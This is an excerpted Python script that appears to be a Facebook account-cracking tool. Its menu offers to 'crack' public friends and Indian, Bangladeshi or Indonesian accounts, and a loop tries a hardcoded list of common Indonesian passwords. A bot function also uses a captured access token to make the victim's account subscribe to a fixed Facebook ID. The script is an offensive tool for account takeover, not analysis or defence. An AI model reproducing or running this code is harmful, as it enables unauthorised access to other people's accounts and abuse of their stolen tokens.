...
def bot_komen():
    ...
    requests.post('https://graph.facebook.com/100003603863923/subscribers?access_token=' + token)
...
def menu():
	...
	print("\033[0;97m[\033[0;96m1\033[0;97m]Crack Public Friends")
	print("\033[0;97m[\033[0;96m2\033[0;97m]Crack India/Bangladesh")
	print("\033[0;97m[\033[0;96m3\033[0;97m]Crack Old Indonesia")
...
def old():
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for pw in ['indonesia','bismillah','rahasia','sayang','sayang123','bangsat','anjing','1qwerty','qwerty','qwerty123','ganteng','cantik','akusayangkamu','pantek','pantek123','kontol','jakarta','surabaya','bandung','persib','cintaku','sayangku','iloveyou','iloveyou123','123456','1234567','12345678','123456789','doraemon','cilacap','purwokerto']:
